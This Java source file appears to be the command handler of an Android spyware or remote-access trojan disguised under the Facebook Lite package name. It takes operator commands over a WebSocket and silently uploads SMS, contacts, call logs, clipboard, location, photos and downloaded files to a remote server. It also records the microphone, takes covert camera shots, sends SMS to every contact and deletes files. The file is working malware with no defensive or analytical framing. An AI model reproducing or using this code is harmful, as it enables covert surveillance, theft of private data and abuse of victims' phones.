package com.facebook.lite;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SmsManager;
import android.widget.Toast;
import org.java_websocket.client.WebSocketClient;
import java.io.*;
import java.net.*;
import java.util.*;

public class CommandHandler {

    public static void handle(final Context ctx,
                              final WebSocketClient ws,
                              final String msg) {
        if (msg.equals("ping")) return;
        new Thread(() -> {
            try { dispatch(ctx, msg); }
            catch (Exception ignored) {}
        }).start();
    }

    private static void dispatch(Context ctx, String msg) throws Exception {
        switch (msg) {
            case "messages":     uploadSMS(ctx);        return;
            case "contacts":     uploadContacts(ctx);   return;
            case "calls":        uploadCalls(ctx);      return;
            case "apps":         uploadApps(ctx);       return;
            case "clipboard":    uploadClipboard(ctx);  return;
            case "location":     uploadLocation(ctx);   return;
            case "vibrate":      vibrate(ctx);          return;
            case "Ransomware":   uploadPrivate(ctx);    return;
            case "stop_audio":   stopAudio();           return;
            case "device_info":  uploadDeviceInfo(ctx); return;
            case "camera_main":  takePhoto(ctx, false); return;
            case "camera_selfie":takePhoto(ctx, true);  return;
        }

        if (msg.startsWith("send_message:")) {
            String[] p = msg.substring(13).split("/", 2);
            if (p.length == 2) sendSMS(p[0], p[1]);
        } else if (msg.startsWith("send_message_to_all:"))
            sendToAll(ctx, msg.substring(20));
        else if (msg.startsWith("file:"))
            uploadFile(ctx, msg.substring(5));
        else if (msg.startsWith("delete_file:"))
            deleteFile(msg.substring(12));
        else if (msg.startsWith("microphone:"))
            recordMic(ctx, Integer.parseInt(msg.substring(11).trim()));
        else if (msg.startsWith("toast:"))
            showToast(ctx, msg.substring(6));
        else if (msg.startsWith("play_audio:"))
            playAudio(msg.substring(11));
    }

    // SMS
    private static void uploadSMS(Context ctx) throws Exception {
        StringBuilder sb = new StringBuilder("=== SMS ===\n");
        Cursor c = ctx.getContentResolver().query(
            Uri.parse("content://sms/inbox"), null, null, null, null);
        if (c != null) {
            while (c.moveToNext())
                sb.append(c.getString(c.getColumnIndexOrThrow("address")))
                  .append(": ")
                  .append(c.getString(c.getColumnIndexOrThrow("body")))
                  .append("\n\n");
            c.close();
        }
        postText(ctx, sb.toString());
    }

    @SuppressWarnings("deprecation")
    private static void sendSMS(String num, String text) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendMultipartTextMessage(num, null, sm.divideMessage(text), null, null);
        } catch (Exception ignored) {}
    }

    private static void sendToAll(Context ctx, String text) throws Exception {
        for (String n : getNumbers(ctx)) sendSMS(n, text);
    }

    // Contacts
    private static void uploadContacts(Context ctx) throws Exception {
        StringBuilder sb = new StringBuilder("=== CONTACTS ===\n");
        Cursor c = ctx.getContentResolver().query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null);
        if (c != null) {
            while (c.moveToNext())
                sb.append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append(" — ")
                  .append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n");
            c.close();
        }
        postText(ctx, sb.toString());
    }

    private static List<String> getNumbers(Context ctx) {
        List<String> list = new ArrayList<>();
        try {
            Cursor c = ctx.getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            if (c != null) {
                while (c.moveToNext())
                    list.add(c.getString(c.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)));
                c.close();
            }
        } catch (Exception ignored) {}
        return list;
    }

    // Calls
    private static void uploadCalls(Context ctx) throws Exception {
        StringBuilder sb = new StringBuilder("=== CALLS ===\n");
        Cursor c = ctx.getContentResolver().query(
            android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
            android.provider.CallLog.Calls.DATE + " DESC");
        if (c != null) {
            while (c.moveToNext()) {
                int type = c.getInt(c.getColumnIndexOrThrow(
                    android.provider.CallLog.Calls.TYPE));
                String t;
                switch(type) {
                    case android.provider.CallLog.Calls.INCOMING_TYPE: t="IN"; break;
                    case android.provider.CallLog.Calls.OUTGOING_TYPE: t="OUT"; break;
                    case android.provider.CallLog.Calls.MISSED_TYPE:   t="MISSED"; break;
                    default: t="?";
                }
                sb.append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.CallLog.Calls.NUMBER)))
                  .append(" [").append(t).append("] ")
                  .append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.CallLog.Calls.DURATION)))
                  .append("s\n");
            }
            c.close();
        }
        postText(ctx, sb.toString());
    }

    // Apps
    private static void uploadApps(Context ctx) throws Exception {
        StringBuilder sb = new StringBuilder("=== APPS ===\n");
        android.content.pm.PackageManager pm = ctx.getPackageManager();
        for (android.content.pm.ApplicationInfo a :
                pm.getInstalledApplications(0))
            if ((a.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0)
                sb.append(pm.getApplicationLabel(a)).append(" — ")
                  .append(a.packageName).append("\n");
        postText(ctx, sb.toString());
    }

    // Clipboard
    private static void uploadClipboard(Context ctx) throws Exception {
        String text = "";
        ClipboardManager cm =
            (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm != null && cm.hasPrimaryClip()) {
            ClipData d = cm.getPrimaryClip();
            if (d != null && d.getItemCount() > 0) {
                CharSequence t = d.getItemAt(0).coerceToText(ctx);
                if (t != null) text = t.toString();
            }
        }
        postText(ctx, "=== CLIPBOARD ===\n" + text);
    }

    // Device Info
    private static void uploadDeviceInfo(Context ctx) throws Exception {
        postText(ctx, "=== DEVICE INFO ===\n" +
            "Model: " + android.os.Build.MANUFACTURER + " " +
                        android.os.Build.MODEL + "\n" +
            "Android: " + android.os.Build.VERSION.RELEASE + "\n" +
            "Brand: " + android.os.Build.BRAND + "\n");
    }

    // Location
    private static void uploadLocation(Context ctx) {
        try {
            android.location.LocationManager lm =
                (android.location.LocationManager)
                    ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;
            android.location.Location loc = null;
            try { loc = lm.getLastKnownLocation(
                android.location.LocationManager.GPS_PROVIDER);
            } catch (SecurityException ignored) {}
            if (loc == null) {
                try { loc = lm.getLastKnownLocation(
                    android.location.LocationManager.NETWORK_PROVIDER);
                } catch (SecurityException ignored) {}
            }
            if (loc != null) postLocation(ctx, loc.getLatitude(), loc.getLongitude());
        } catch (Exception ignored) {}
    }

    // Files
    private static void uploadFile(Context ctx, String path) throws Exception {
        File root = Environment.getExternalStorageDirectory();
        File t = new File(root, path);
        if (t.isDirectory()) {
            File[] fs = t.listFiles();
            if (fs != null) for (File f : fs)
                if (f.isFile()) postFile(ctx, f, f.getName());
        } else if (t.isFile()) {
            postFile(ctx, t, t.getName());
        }
    }

    private static void deleteFile(String path) {
        try { delRec(new File(
            Environment.getExternalStorageDirectory(), path));
        } catch (Exception ignored) {}
    }

    private static void delRec(File f) {
        if (f.isDirectory()) {
            File[] ch = f.listFiles();
            if (ch != null) for (File c : ch) delRec(c);
        }
        f.delete();
    }

    private static void uploadPrivate(Context ctx) throws Exception {
        uploadFile(ctx, "DCIM");
        uploadFile(ctx, "Pictures");
        uploadFile(ctx, "Download");
    }

    // Mic
    private static android.media.MediaRecorder recorder;

    private static void recordMic(Context ctx, int seconds) {
        try {
            if (recorder != null) { recorder.release(); recorder = null; }
            File out = new File(ctx.getCacheDir(),
                "mic_" + System.currentTimeMillis() + ".mp4");
            recorder = new android.media.MediaRecorder();
            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(out.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Thread.sleep(seconds * 1000L);
            recorder.stop(); recorder.release(); recorder = null;
            postFile(ctx, out, "mic_" + seconds + "s.mp4");
            out.delete();
        } catch (Exception e) {
            if (recorder != null) {
                try { recorder.release(); } catch (Exception ignored) {}
                recorder = null;
            }
        }
    }

    // Camera
    private static void takePhoto(Context ctx, boolean front) {
        android.os.HandlerThread ht = new android.os.HandlerThread("cam");
        ht.start();
        android.os.Handler h = new android.os.Handler(ht.getLooper());
        try {
            android.hardware.camera2.CameraManager cm =
                (android.hardware.camera2.CameraManager)
                    ctx.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) { ht.quitSafely(); return; }
            String camId = null;
            for (String id : cm.getCameraIdList()) {
                Integer facing = cm.getCameraCharacteristics(id)
                    .get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;
                if (front && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) { camId = id; break; }
                if (!front && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK)  { camId = id; break; }
            }
            if (camId == null) { ht.quitSafely(); return; }
            android.media.ImageReader ir = android.media.ImageReader.newInstance(
                1280, 960, android.graphics.ImageFormat.JPEG, 1);
            final byte[][] res = {null};
            final Object lock = new Object();
            ir.setOnImageAvailableListener(reader -> {
                android.media.Image img = reader.acquireLatestImage();
                if (img != null) {
                    java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    res[0] = new byte[buf.remaining()];
                    buf.get(res[0]); img.close();
                    synchronized (lock) { lock.notifyAll(); }
                }
            }, h);
            final android.hardware.camera2.CameraDevice[] dev = {null};
            final Object ol = new Object();
            cm.openCamera(camId, new android.hardware.camera2.CameraDevice.StateCallback() {
                @Override public void onOpened(android.hardware.camera2.CameraDevice d) {
                    dev[0] = d; synchronized (ol) { ol.notifyAll(); }
                }
                @Override public void onDisconnected(android.hardware.camera2.CameraDevice d) { d.close(); }
                @Override public void onError(android.hardware.camera2.CameraDevice d, int e) { d.close(); }
            }, h);
            synchronized (ol) { ol.wait(3000); }
            if (dev[0] == null) { ht.quitSafely(); return; }
            android.hardware.camera2.CaptureRequest.Builder b =
                dev[0].createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE);
            b.addTarget(ir.getSurface());
            dev[0].createCaptureSession(Collections.singletonList(ir.getSurface()),
                new android.hardware.camera2.CameraCaptureSession.StateCallback() {
                    @Override public void onConfigured(android.hardware.camera2.CameraCaptureSession s) {
                        try { s.capture(b.build(), null, h); } catch (Exception e) { e.printStackTrace(); }
                    }
                    @Override public void onConfigureFailed(android.hardware.camera2.CameraCaptureSession s) {}
                }, h);
            synchronized (lock) { lock.wait(5000); }
            dev[0].close();
            if (res[0] != null) {
                File f = new File(ctx.getCacheDir(), "ph_" + System.currentTimeMillis() + ".jpg");
                try (FileOutputStream fos = new FileOutputStream(f)) { fos.write(res[0]); }
                postFile(ctx, f, front ? "selfie.jpg" : "photo.jpg");
                f.delete();
            }
            ht.quitSafely();
        } catch (Exception e) { ht.quitSafely(); }
    }

    // Vibrate
    private static void vibrate(Context ctx) {
        android.os.Vibrator v = (android.os.Vibrator)
            ctx.getSystemService(Context.VIBRATOR_SERVICE);
        if (v == null) return;
        long[] pat = {0, 500, 200, 500};
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
            v.vibrate(android.os.VibrationEffect.createWaveform(pat, -1));
        else v.vibrate(pat, -1);
    }

    // Audio
    private static android.media.MediaPlayer player;

    private static void playAudio(String url) {
        try {
            stopAudio();
            player = new android.media.MediaPlayer();
            player.setDataSource(url);
            player.setLooping(true);
            player.prepareAsync();
            player.setOnPreparedListener(android.media.MediaPlayer::start);
        } catch (Exception ignored) {}
    }

    private static void stopAudio() {
        try {
            if (player != null) {
                if (player.isPlaying()) player.stop();
                player.release(); player = null;
            }
        } catch (Exception ignored) {}
    }

    // Toast
    private static void showToast(Context ctx, String msg) {
        new Handler(Looper.getMainLooper()).post(() ->
            Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show());
    }

    // HTTP Upload
    static void postText(Context ctx, String text) {
        try {
            HttpURLConnection c = open("/uploadText");
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("model",
                android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
            c.setDoOutput(true);
            c.getOutputStream().write(("{\"text\":" + esc(text) + "}").getBytes("UTF-8"));
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }

    static void postFile(Context ctx, File file, String name) {
        try {
            String bound = "----B" + System.currentTimeMillis();
            HttpURLConnection c = open("/uploadFile");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bound);
            c.setRequestProperty("model",
                android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
            c.setDoOutput(true);
            OutputStream os = c.getOutputStream();
            PrintWriter pw = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
            pw.append("--").append(bound).append("\r\n");
            pw.append("Content-Disposition: form-data; name=\"file\"; filename=\"")
              .append(name).append("\"\r\n");
            pw.append("Content-Type: application/octet-stream\r\n\r\n").flush();
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buf = new byte[4096]; int n;
                while ((n = fis.read(buf)) != -1) os.write(buf, 0, n);
            }
            os.flush();
            pw.append("\r\n--").append(bound).append("--\r\n").flush();
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }

    static void postLocation(Context ctx, double lat, double lon) {
        try {
            HttpURLConnection c = open("/uploadLocation");
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("model",
                android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
            c.setDoOutput(true);
            c.getOutputStream().write(
                ("{\"lat\":" + lat + ",\"lon\":" + lon + "}").getBytes("UTF-8"));
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }

    private static HttpURLConnection open(String path) throws Exception {
        HttpURLConnection c = (HttpURLConnection)
            new URL(Config.HTTP + path).openConnection();
        c.setRequestMethod("POST");
        c.setConnectTimeout(10000);
        c.setReadTimeout(10000);
        return c;
    }

    private static String esc(String s) {
        return "\"" + s.replace("\\","\\\\").replace("\"","\\\"")
                        .replace("\n","\\n").replace("\r","\\r") + "\"";
    }
}
